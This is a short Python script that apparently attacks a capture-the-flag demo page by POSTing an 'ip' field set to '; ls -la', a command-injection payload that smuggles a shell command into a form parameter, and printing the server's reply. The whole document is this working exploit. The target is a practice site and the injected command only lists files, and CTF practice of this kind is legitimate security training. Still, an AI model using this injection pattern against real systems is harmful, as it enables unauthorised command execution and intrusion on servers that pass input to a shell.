import requests

url="http://ctf.nmatt.com/demo4.php"
cmd = "; ls -la"
d = {'ip': cmd}
r = requests.post(url, data=d)
print(r.text)
